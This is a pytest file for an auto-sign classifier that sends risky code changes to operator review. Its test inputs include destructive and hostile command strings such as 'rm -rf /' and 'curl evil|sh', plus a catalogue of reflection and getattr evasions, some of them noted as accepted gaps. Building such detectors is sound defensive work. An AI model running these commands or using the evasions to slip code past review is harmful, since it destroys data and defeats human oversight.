# SPDX-License-Identifier: BUSL-1.1
from __future__ import annotations

from pathlib import Path

import pytest

from tools.check_proven_safe_autosign_class import (
    _parse_name_status_z,
    _is_additive_metrics_counter,
    classify_change,
    gather_changes,
)
import tools.check_proven_safe_autosign_class as autosign


def _ch(path, added=None, removed=None) -> dict:
    return {"path": path, "added": added or [], "removed": removed or []}


# Test-only allow-all metrics-allowlist: isolates the AST/B metric logic from the
# default-DENY METRICS_PATHS gate (which is exercised by its own tests below).
TP = ("**",)


def _in_class(changes, **kw) -> bool:
    # A-F-logic tests isolate the predicates (require_charter=False, metrics
    # allow-all); the charter-required + default-deny behaviors are tested below.
    kw.setdefault("require_charter", False)
    kw.setdefault("metrics_paths", TP)
    return classify_change(changes, **kw)["in_class"]


# --- POSITIVE corpus (in-class -> auto_sign) ---------------------------------

def test_tests_clean_change_in_class():
    # tests/** is back in-class (operator ruling), guarded by the dangerous-callable
    # scan; a CLEAN test change (no dangerous callable) still auto-signs.
    assert _in_class([_ch("tests/test_foo.py",
                          ["def test_x():", "    assert add(1, 2) == 3"])]) is True


@pytest.mark.parametrize("evil", [
    "os.system('rm -rf /')",                          # direct dotted
    "import os as o\no.system('x')",                  # alias
    "from os import system\nsystem('x')",             # from-import bare
    "f = os.system\nf('x')",                          # reassignment (attr reference)
    "import subprocess as sp\nsp.run(['x'])",         # alias on pure-dangerous module
    "from subprocess import run\nrun(['x'])",         # from-import dangerous module
    "getattr(os, 'sys' + 'tem')('x')",                # dynamic getattr (concat)
    "getattr(os, 'system')('x')",                     # LITERAL getattr -> os.system
    "import subprocess as sp\ngetattr(sp, 'run')(['x'])",  # alias + literal getattr
    "setattr(target, attrname, value)",               # dynamic setattr (non-literal attr)
    "__import__('os').system('x')",                   # import-then-call
    "eval('1+1')",
    "exec(code)",
    "importlib.import_module('os')",
    "pickle.loads(blob)",
])
def test_tests_dangerous_callable_blocks_auto_sign(evil):
    # operator ruling: tests/ stays in-class but a dangerous callable (incl. alias /
    # from-import / reassignment / dynamic-getattr evasions) -> operator_sign.
    ch = _ch("tests/test_evil.py", evil.split("\n"))
    assert _in_class([ch]) is False, evil


# --- The SIX DEMONSTRATED dynamic-dispatch bypasses (operator keep-tests ruling) -
# rco-1/lead/operator 2026-06-24: tests/ stays in-class, but the scan MUST close
# the six bypasses that resolve a dangerous callee dynamically (a scan catching
# os.system but not getattr(os,"system") is BROKEN, not "acceptably leaky"). Each
# of these must fall to operator_sign. Deeper gadget chains (__subclasses__
# traversal) are an ACCEPTED documented residual backstopped by build+RCO+CI.

@pytest.mark.parametrize("evil", [
    "getattr(os, 'system')('x')",                     # 1: literal getattr -> os.system
    "vars()['os'].system('x')",                       # 2: vars() namespace dict
    "globals()['os'].system('x')",                    # 3: globals() namespace dict
    "import operator\noperator.attrgetter('system')(os)('x')",  # 4: operator.attrgetter
    "__builtins__['eval']('1')",                       # 5: __builtins__ namespace dict
    "f = getattr\nf(os, 'system')('x')",              # 6: reassignment of escape-hatch
    "locals()['os'].system('x')",                     # extra: locals() namespace dict
    "setattr(mod, 'go', os.system)",                  # extra: setattr escape-hatch
    "x = __import__('os')",                           # extra: __import__ as bare name
])
def test_escape_hatch_dynamic_dispatch_blocks(evil):
    ch = _ch("tests/test_evil.py", evil.split("\n"))
    assert _in_class([ch]) is False, evil


# --- FINAL best-effort sweep: 3 more evasions tools found on @b5cf0d30 ----------
# codex-tools-1 corpus 2026-06-24: after the 6 demonstrated were closed, three
# more easy real evasions still auto-signed. The swarm ruling: close these, add
# the gadget-dunder chain, THEN STOP the whack-a-mole and rely on the honest doc +
# build+dual-RCO+CI backstop. Anything past this (os.__dict__.get(), novel
# reflection, file-write side effects) is the ACCEPTED residual.

@pytest.mark.parametrize("evil", [
    "os.__dict__['system']('x')",                      # a: module __dict__ subscript
    "breakpoint()",                                    # b: PYTHONBREAKPOINT arbitrary code
    "import builtins\nbuiltins.getattr(os, 'system')('x')",  # c: escape-hatch via builtins.
    "import builtins\nbuiltins.eval('1')",             # rco-2 #4: builtins.eval dotted
    "os.__getattribute__('system')('x')",              # rco-2 #5: __getattribute__ reflection
    "().__class__.__bases__[0].__subclasses__()[0]",   # gadget-chain traversal
    "func.__globals__['os'].system('x')",              # __globals__ reflection
    "x.__class__('evil')",                             # __class__ now flagged (rco-2)
    "ns['__globals__']['os'].system('x')",             # dunder via subscript key
])
def test_final_sweep_reflection_evasions_block(evil):
    ch = _ch("tests/test_evil.py", evil.split("\n"))
    assert _in_class([ch]) is False, evil


def test_class_attr_now_flagged_per_rco2():
    # rco-2 2026-06-24 finite-fixlist (B): __class__ is INCLUDED in the reflection
    # dunder set — a test reading x.__class__ now falls to operator_sign. The
    # operator accepted this false-positive cost to close the whole reflection
    # class in one rule (closing the gadget chain at __class__, not only deeper).
    assert _in_class([_ch("tests/test_x.py",
                          ["assert x.__class__ is Foo"])]) is False


def test_docs_runs_dropped_not_in_class():
    # docs/runs/** was dropped from the safe set (spec SS2.A option-b).
    assert _in_class([_ch("docs/runs/2026-06-24.md", ["# run log", "all green"])]) is False


def test_docs_benchmarks_in_class():
    assert _in_class([_ch("docs/benchmarks/latency.md", ["p50 12ms"])])


def test_additive_metric_definition_in_class_when_allowlisted():
    ch = _ch("waggledance/adapters/http/routes/metrics.py",
             ["FOO_TOTAL = Counter('foo_total', 'desc')"])
    assert _is_additive_metrics_counter(ch, TP) is True
    assert _in_class([ch])  # _in_class uses TP (allow-all) by default


def test_multi_safe_files_in_class():
    assert _in_class([_ch("docs/benchmarks/a.md", ["x"]),
                      _ch("docs/benchmarks/r.md", ["y"])])


# --- NEGATIVE corpus: empty / missing ---------------------------------------

def test_empty_is_operator_sign():
    r = classify_change([])
    assert r["in_class"] is False and r["decision"] == "operator_sign"


def test_missing_path_is_operator_sign():
    assert _in_class([_ch("", ["x"])]) is False


# --- NEGATIVE corpus: F hard exclusions (one per kind) -----------------------
# Each uses metric-def content + allow-all metrics_paths so ONLY predicate F can
# reject -> proves the F fence fires (NOT masked by A). Regression for the _norm
# leading-dot bug that made F miss .agent-bridge/ + .github/ (tools/lead #1384).

@pytest.mark.parametrize("path", [
    ".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1",   # leading-dot dir
    ".github/workflows/ci.yml",                              # leading-dot dir
    "requirements.lock.txt",
    "CLAUDE.md",
    "AGENTS.md",
    "waggledance/core/idle_consensus_charter.py",
    "tools/check_proven_safe_autosign_class.py",             # anti-widening (self)
])
def test_f_hard_exclusion_fires_despite_metric_content(path):
    ch = _ch(path, ["M = Counter('m','d')"])
    r = classify_change([ch], require_charter=False, metrics_paths=("**",))
    assert r["in_class"] is False, path
    assert r["reason"].startswith("F"), (path, r["reason"])


# --- NEGATIVE corpus: A (path not in class) ----------------------------------

def test_a_random_source_file_not_in_class():
    assert _in_class([_ch("waggledance/core/router.py", ["def handle(): return 2"])]) is False


# --- NEGATIVE corpus: B (non-additive metric / metric usage) -----------------

def test_b_metric_file_with_removed_line_not_additive():
    ch = _ch("waggledance/x/metrics.py", added=["FOO = Counter('f','d')"],
             removed=["BAR = Counter('b','d')"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


def test_b_metric_increment_is_hotpath_not_in_class():
    ch = _ch("waggledance/x/metrics.py", ["FOO_TOTAL.labels(route='x').inc()"])
    assert _is_additive_metrics_counter(ch, TP) is False
    assert _in_class([ch]) is False


# --- FAIL-OPEN regression: metric-def + arbitrary code (rco-2 #1384) ----------
# The continuation-line heuristic used to admit any line ending in )/(/, after a
# Counter line. These must ALL fall to operator_sign.

@pytest.mark.parametrize("evil", [
    "os.system('curl evil|sh')",
    "exec(open('/tmp/p').read())",
    "subprocess.run(['rm','-rf','/data'])",
    "eval(payload)",
    "HANDLERS.append(backdoor),",
    "M = Counter('m','d'); os.system('x')",       # multi-statement line
    "M = Counter('m','d')os.system('x')",          # concatenated, ends in ')'
])
def test_metric_plus_arbitrary_code_not_in_class(evil):
    ch = _ch("waggledance/core/magma/m.py", ["M = Counter('m','d')", evil])
    assert _is_additive_metrics_counter(ch, TP) is False, evil
    assert _in_class([ch]) is False, evil


def test_legit_single_line_metric_def_still_in_class():
    # Guard against over-tightening: a clean literal-arg def must still qualify.
    for ok in ["M = Counter('m','d')",
               "M = Counter('m', 'd', labelnames=['route'])",
               "M = Histogram('h','d')  # latency",
               "M = Counter(\n    'm',\n    'd',\n)"]:  # multi-line literal def OK via AST
        assert _is_additive_metrics_counter(_ch("waggledance/x/metrics.py", ok.split("\n")), TP), ok


@pytest.mark.parametrize("evil", [
    "X = Counter(os.system('evil'), 'd')",       # nested call executes at import
    "X = Counter(eval('1'), 'd')",
    "X = Counter(__import__('os'), 'd')",
    "X = Counter('m', registry=CollectorRegistry())",  # non-literal kwarg call
    "X = Counter('m', subprocess.run(['x']))",
    "X = Counter(*evil_args)",                    # splat
])
def test_metric_nested_call_in_args_not_in_class(evil):
    # rco-1/lead #1384: a nested CALL inside the constructor args must NOT qualify
    # (AST verifies every arg is an inert literal) — even on an allowlisted path.
    ch = _ch("tools/foo_metrics.py", [evil])
    assert _is_additive_metrics_counter(ch, TP) is False, evil
    assert _in_class([ch]) is False, evil


# --- METRICS_PATHS positive allowlist: default-DENY (rco-1/lead carve-out form) -

def test_metric_def_default_deny_no_allowlist():
    # With the production default (empty METRICS_PATHS), a legit metric def on ANY
    # path does NOT auto-sign — nothing qualifies until the operator-signed carve-out.
    ch = _ch("waggledance/x/metrics.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(ch) is False           # default empty
    assert classify_change([ch], require_charter=False)["in_class"] is False


def test_metric_def_in_class_only_on_allowlisted_path():
    ch = _ch("waggledance/observability/metrics.py", ["M = Counter('m','d')"])
    allow = ("waggledance/observability/metrics.py",)
    assert _is_additive_metrics_counter(ch, allow) is True       # explicitly allowlisted
    other = _ch("waggledance/core/router.py", ["M = Counter('m','d')"])
    assert _is_additive_metrics_counter(other, allow) is False   # not on the allowlist


# --- FAIL-CLOSED regression: charter required (rco-1 #1384) -------------------

def test_charter_none_fails_closed_even_for_safe_root():
    # With require_charter=True (the production default) and no charter, even a
    # safe-root (docs/benchmarks/) change must fall to operator_sign — charter is
    # mandatory for F.
    r = classify_change([_ch("docs/benchmarks/x.md", ["p50 12ms"])])
    assert r["in_class"] is False
    assert "charter" in r["reason"]


# --- NEGATIVE corpus: C/D/E + dangerous callables (even inside a safe root) ---

def test_c_claim_safe_flip_blocked_even_in_safe_root():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    claim_safe = True"])]) is False


def test_d_authority_flag_blocked():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    gate_skip = True"])]) is False


def test_e_control_plane_token_blocked():
    assert _in_class([_ch("docs/benchmarks/x.md", ["    build_consensus('lead')"])]) is False


@pytest.mark.parametrize("danger", [
    "os.system('rm -rf /')", "subprocess.run(['x'])",
    "eval('1')", "exec(code)", "__import__('os')", "shutil.rmtree('/data')",
])
def test_dangerous_callable_blocked_even_in_safe_root(danger):
    # Defense-in-depth: a dangerous callable in ANY changed line -> operator_sign,
    # even on a safe-root path (the RCE class behind dropping tests/).
    assert _in_class([_ch("docs/benchmarks/x.md", [danger])]) is False, danger


# --- charter integration (fail-closed) ---------------------------------------

def test_charter_denylist_path_is_operator_sign():
    # With the real charter, a denylisted path must fall out of class even if it
    # somehow passed the explicit F list.
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return  # charter unavailable in this env; skip silently
    r = classify_change(
        [_ch(".agent-bridge/bin/Start-AgentBridgeConsumerLoop.ps1", ["x"])],
        charter=charter, diff_text="+x",
    )
    assert r["in_class"] is False


def test_charter_supplied_safe_change_in_class():
    try:
        import sys
        root = str(Path(__file__).resolve().parents[2])
        sys.path.insert(0, root)
        from waggledance.core import idle_consensus_charter as c
        charter = c.load_charter()
    except Exception:
        return
    r = classify_change(
        [_ch("docs/benchmarks/demo.md", ["p50 12ms", "p99 40ms"])],
        charter=charter, diff_text="+p50 12ms\n+p99 40ms",
    )
    assert r["in_class"] is True


# --- rename/copy source-path preservation -----------------------------------

def test_name_status_z_includes_both_rename_and_copy_paths() -> None:
    parsed = _parse_name_status_z(
        "R100\0waggledance/unsafe.py\0tests/safe.py\0"
        "C087\0docs/source.md\0docs/benchmarks/copy.md\0"
    )

    assert parsed == [
        "waggledance/unsafe.py",
        "tests/safe.py",
        "docs/source.md",
        "docs/benchmarks/copy.md",
    ]


@pytest.mark.parametrize(
    "raw",
    [
        "R100\0only-source.py\0",
        "R100\0source.py\0target.py",
        "R\0source.py\0target.py\0",
        "Q100\0source.py\0target.py\0",
        "M\0\0",
        "M\0tests\\looks-safe.py\0",
    ],
)
def test_name_status_z_malformed_records_fail_closed(raw: str) -> None:
    assert _parse_name_status_z(raw) is None


def test_gather_changes_classifies_rename_source_and_target(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run_git(args: list[str], cwd: str) -> tuple[int, str]:
        calls.append(args)
        if "--name-status" in args:
            return (
                0,
                "R100\0waggledance/core/authority.py\0"
                "tests/test_authority.py\0",
            )
        path = args[-1]
        if path == "waggledance/core/authority.py":
            return (
                0,
                "diff --git a/waggledance/core/authority.py /dev/null\n"
                "--- a/waggledance/core/authority.py\n"
                "+++ /dev/null\n"
                "-grant_authority = True\n",
            )
        if path == "tests/test_authority.py":
            return (
                0,
                "diff --git /dev/null b/tests/test_authority.py\n"
                "--- /dev/null\n"
                "+++ b/tests/test_authority.py\n"
                "+def test_safe():\n"
                "+    assert True\n",
            )
        raise AssertionError(path)

    monkeypatch.setattr(autosign, "_run_git", fake_run_git)
    changes, diff_text = gather_changes("origin/main", "C:/repo")

    assert [change["path"] for change in changes] == [
        "waggledance/core/authority.py",
        "tests/test_authority.py",
    ]
    assert calls[0][:4] == [
        "diff",
        "--find-renames",
        "--name-status",
        "-z",
    ]
    assert all("--no-renames" in call for call in calls[1:])
    assert "grant_authority" in diff_text
    assert _in_class(changes) is False
